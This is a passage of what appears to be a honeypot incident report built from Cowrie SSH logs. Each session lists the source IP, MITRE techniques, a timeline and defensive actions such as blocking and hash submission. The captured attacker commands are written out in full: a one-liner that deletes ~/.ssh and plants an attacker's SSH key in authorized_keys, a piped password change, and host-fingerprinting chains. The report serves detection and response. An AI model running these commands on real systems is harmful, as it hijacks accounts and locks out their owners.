| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:04:42` | `cowrie.session.connect` |
| `2026-07-22 06:04:42` | `cowrie.client.version` |
| `2026-07-22 06:04:42` | `cowrie.client.kex` |
| `2026-07-22 06:04:43` | `cowrie.login.success` |
| `2026-07-22 06:04:44` | `cowrie.session.params` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.success` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.command.input` |
| `2026-07-22 06:04:44` | `cowrie.log.closed` |
| `2026-07-22 06:04:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-429a666273d8

| Field | Detail |
|---|---|
| **Source IP** | `122.227.103[.]254` |
| **First Seen** | 2026-07-22 06:06 |
| **Last Seen** | 2026-07-22 06:06 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:06:15` | `cowrie.session.connect` |
| `2026-07-22 06:06:15` | `cowrie.client.version` |
| `2026-07-22 06:06:15` | `cowrie.client.kex` |
| `2026-07-22 06:06:17` | `cowrie.login.success` |
| `2026-07-22 06:06:18` | `cowrie.session.params` |
| `2026-07-22 06:06:18` | `cowrie.command.input` |
| `2026-07-22 06:06:18` | `cowrie.command.failed` |
| `2026-07-22 06:06:18` | `cowrie.log.closed` |
| `2026-07-22 06:06:19` | `cowrie.session.params` |
| `2026-07-22 06:06:19` | `cowrie.command.input` |
| `2026-07-22 06:06:20` | `cowrie.session.file_download` |
| `2026-07-22 06:06:20` | `cowrie.log.closed` |
| `2026-07-22 06:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.227.103[.]254` to AbuseIPDB if not already reported
- [ ] Block `122.227.103[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7e80418a94f

| Field | Detail |
|---|---|
| **Source IP** | `122.227.103[.]254` |
| **First Seen** | 2026-07-22 06:06 |
| **Last Seen** | 2026-07-22 06:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:06:29` | `cowrie.session.connect` |
| `2026-07-22 06:06:29` | `cowrie.client.version` |
| `2026-07-22 06:06:29` | `cowrie.client.kex` |
| `2026-07-22 06:06:30` | `cowrie.login.success` |
| `2026-07-22 06:06:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.227.103[.]254` to AbuseIPDB if not already reported
- [ ] Block `122.227.103[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06cd07885095

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:06 |
| **Last Seen** | 2026-07-22 06:06 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:06:45` | `cowrie.session.connect` |
| `2026-07-22 06:06:45` | `cowrie.client.version` |
| `2026-07-22 06:06:45` | `cowrie.client.kex` |
| `2026-07-22 06:06:46` | `cowrie.login.success` |
| `2026-07-22 06:06:47` | `cowrie.session.params` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.success` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.command.input` |
| `2026-07-22 06:06:47` | `cowrie.log.closed` |
| `2026-07-22 06:06:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6642cd5c68a9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:08 |
| **Last Seen** | 2026-07-22 06:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:08:46` | `cowrie.session.connect` |
| `2026-07-22 06:08:46` | `cowrie.client.version` |
| `2026-07-22 06:08:46` | `cowrie.client.kex` |
| `2026-07-22 06:08:48` | `cowrie.login.success` |
| `2026-07-22 06:08:49` | `cowrie.session.params` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.success` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.command.input` |
| `2026-07-22 06:08:49` | `cowrie.log.closed` |
| `2026-07-22 06:08:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3f33429e259

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:10 |
| **Last Seen** | 2026-07-22 06:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:10:45` | `cowrie.session.connect` |
| `2026-07-22 06:10:45` | `cowrie.client.version` |
| `2026-07-22 06:10:45` | `cowrie.client.kex` |
| `2026-07-22 06:10:46` | `cowrie.login.success` |
| `2026-07-22 06:10:47` | `cowrie.session.params` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.success` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:47` | `cowrie.command.input` |
| `2026-07-22 06:10:48` | `cowrie.log.closed` |
| `2026-07-22 06:10:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1339714a2bee

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 06:10 |
| **Last Seen** | 2026-07-22 06:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:10:58` | `cowrie.session.connect` |
| `2026-07-22 06:10:58` | `cowrie.client.version` |
| `2026-07-22 06:10:58` | `cowrie.client.kex` |
| `2026-07-22 06:10:59` | `cowrie.login.success` |
| `2026-07-22 06:10:59` | `cowrie.session.params` |
| `2026-07-22 06:10:59` | `cowrie.command.input` |
| `2026-07-22 06:10:59` | `cowrie.log.closed` |
| `2026-07-22 06:10:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-191c88382c04

| Field | Detail |
|---|---|
| **Source IP** | `122.227.103[.]254` |
| **First Seen** | 2026-07-22 06:12 |
| **Last Seen** | 2026-07-22 06:12 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo -e "vhserver\nnpxcqHDRMJEa\nnpxcqHDRMJEa"|passwd|bash, Enter new UNIX password: ` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:12:10` | `cowrie.session.connect` |
| `2026-07-22 06:12:10` | `cowrie.client.version` |
| `2026-07-22 06:12:10` | `cowrie.client.kex` |
| `2026-07-22 06:12:11` | `cowrie.login.success` |
| `2026-07-22 06:12:12` | `cowrie.session.params` |
| `2026-07-22 06:12:12` | `cowrie.command.input` |
| `2026-07-22 06:12:12` | `cowrie.command.failed` |
| `2026-07-22 06:12:13` | `cowrie.log.closed` |
| `2026-07-22 06:12:14` | `cowrie.session.params` |
| `2026-07-22 06:12:14` | `cowrie.command.input` |
| `2026-07-22 06:12:14` | `cowrie.session.file_download` |
| `2026-07-22 06:12:14` | `cowrie.log.closed` |
| `2026-07-22 06:12:31` | `cowrie.session.params` |
| `2026-07-22 06:12:31` | `cowrie.command.input` |
| `2026-07-22 06:12:31` | `cowrie.log.closed` |
| `2026-07-22 06:12:32` | `cowrie.session.params` |
| `2026-07-22 06:12:32` | `cowrie.command.input` |
| `2026-07-22 06:12:32` | `cowrie.command.input` |
| `2026-07-22 06:12:32` | `cowrie.command.failed` |
| `2026-07-22 06:12:33` | `cowrie.log.closed` |
| `2026-07-22 06:12:33` | `cowrie.session.params` |
| `2026-07-22 06:12:33` | `cowrie.command.input` |
| `2026-07-22 06:12:34` | `cowrie.log.closed` |
| `2026-07-22 06:12:35` | `cowrie.session.params` |
| `2026-07-22 06:12:35` | `cowrie.command.input` |
| `2026-07-22 06:12:35` | `cowrie.log.closed` |
| `2026-07-22 06:12:36` | `cowrie.session.params` |
| `2026-07-22 06:12:36` | `cowrie.command.input` |
| `2026-07-22 06:12:37` | `cowrie.log.closed` |
| `2026-07-22 06:12:37` | `cowrie.session.params` |
| `2026-07-22 06:12:37` | `cowrie.command.input` |
| `2026-07-22 06:12:37` | `cowrie.command.input` |
| `2026-07-22 06:12:38` | `cowrie.log.closed` |
| `2026-07-22 06:12:39` | `cowrie.session.params` |
| `2026-07-22 06:12:39` | `cowrie.command.input` |
| `2026-07-22 06:12:39` | `cowrie.log.closed` |
| `2026-07-22 06:12:40` | `cowrie.session.params` |
| `2026-07-22 06:12:40` | `cowrie.command.input` |
| `2026-07-22 06:12:41` | `cowrie.log.closed` |
| `2026-07-22 06:12:41` | `cowrie.session.params` |
| `2026-07-22 06:12:41` | `cowrie.command.input` |
| `2026-07-22 06:12:42` | `cowrie.log.closed` |
| `2026-07-22 06:12:43` | `cowrie.session.params` |
| `2026-07-22 06:12:43` | `cowrie.command.input` |
| `2026-07-22 06:12:44` | `cowrie.log.closed` |
| `2026-07-22 06:12:44` | `cowrie.session.params` |
| `2026-07-22 06:12:44` | `cowrie.command.input` |
| `2026-07-22 06:12:45` | `cowrie.log.closed` |
| `2026-07-22 06:12:46` | `cowrie.session.params` |
| `2026-07-22 06:12:46` | `cowrie.command.input` |
| `2026-07-22 06:12:46` | `cowrie.log.closed` |
| `2026-07-22 06:12:47` | `cowrie.session.params` |
| `2026-07-22 06:12:47` | `cowrie.command.input` |
| `2026-07-22 06:12:47` | `cowrie.log.closed` |
| `2026-07-22 06:12:48` | `cowrie.session.params` |
| `2026-07-22 06:12:48` | `cowrie.command.input` |
| `2026-07-22 06:12:49` | `cowrie.log.closed` |
| `2026-07-22 06:12:49` | `cowrie.session.params` |
| `2026-07-22 06:12:49` | `cowrie.command.input` |
| `2026-07-22 06:12:50` | `cowrie.log.closed` |
| `2026-07-22 06:12:51` | `cowrie.session.params` |
| `2026-07-22 06:12:51` | `cowrie.command.input` |
| `2026-07-22 06:12:51` | `cowrie.log.closed` |
| `2026-07-22 06:12:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.227.103[.]254` to AbuseIPDB if not already reported
- [ ] Block `122.227.103[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3ab038f59c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:12 |
| **Last Seen** | 2026-07-22 06:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:12:51` | `cowrie.session.connect` |
| `2026-07-22 06:12:51` | `cowrie.client.version` |
| `2026-07-22 06:12:51` | `cowrie.client.kex` |
| `2026-07-22 06:12:52` | `cowrie.login.success` |
| `2026-07-22 06:12:53` | `cowrie.session.params` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.success` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.command.input` |
| `2026-07-22 06:12:53` | `cowrie.log.closed` |
| `2026-07-22 06:12:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-749c0797195e

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 06:13 |
| **Last Seen** | 2026-07-22 06:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:13:13` | `cowrie.session.connect` |
| `2026-07-22 06:13:13` | `cowrie.client.version` |
| `2026-07-22 06:13:13` | `cowrie.client.kex` |
| `2026-07-22 06:13:13` | `cowrie.login.success` |
| `2026-07-22 06:13:14` | `cowrie.session.params` |
| `2026-07-22 06:13:14` | `cowrie.command.input` |
| `2026-07-22 06:13:14` | `cowrie.log.closed` |
| `2026-07-22 06:13:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-081724bd7e55

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:14 |
| **Last Seen** | 2026-07-22 06:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:14:52` | `cowrie.session.connect` |
| `2026-07-22 06:14:52` | `cowrie.client.version` |
| `2026-07-22 06:14:52` | `cowrie.client.kex` |
| `2026-07-22 06:14:54` | `cowrie.login.success` |
| `2026-07-22 06:14:55` | `cowrie.session.params` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.success` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.command.input` |
| `2026-07-22 06:14:55` | `cowrie.log.closed` |
| `2026-07-22 06:14:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e2120fcf99f

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]183` |
| **First Seen** | 2026-07-22 06:15 |
| **Last Seen** | 2026-07-22 06:15 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:15:26` | `cowrie.session.connect` |
| `2026-07-22 06:15:26` | `cowrie.client.version` |
| `2026-07-22 06:15:27` | `cowrie.client.kex` |
| `2026-07-22 06:15:27` | `cowrie.login.success` |
| `2026-07-22 06:15:27` | `cowrie.session.params` |
| `2026-07-22 06:15:27` | `cowrie.command.input` |
| `2026-07-22 06:15:28` | `cowrie.log.closed` |
| `2026-07-22 06:15:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]183` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]183` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c5c91cd5695

| Field | Detail |
|---|---|
| **Source IP** | `118.26.153[.]102` |
| **First Seen** | 2026-07-22 06:15 |
| **Last Seen** | 2026-07-22 06:15 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:15:41` | `cowrie.session.connect` |
| `2026-07-22 06:15:42` | `cowrie.client.version` |
| `2026-07-22 06:15:42` | `cowrie.client.kex` |
| `2026-07-22 06:15:44` | `cowrie.login.success` |
| `2026-07-22 06:15:44` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:15:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.153[.]102` to AbuseIPDB if not already reported
- [ ] Block `118.26.153[.]102` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05578a23e729

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:16 |
| **Last Seen** | 2026-07-22 06:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:16:52` | `cowrie.session.connect` |
| `2026-07-22 06:16:52` | `cowrie.client.version` |
| `2026-07-22 06:16:52` | `cowrie.client.kex` |
| `2026-07-22 06:16:53` | `cowrie.login.success` |
| `2026-07-22 06:16:54` | `cowrie.session.params` |
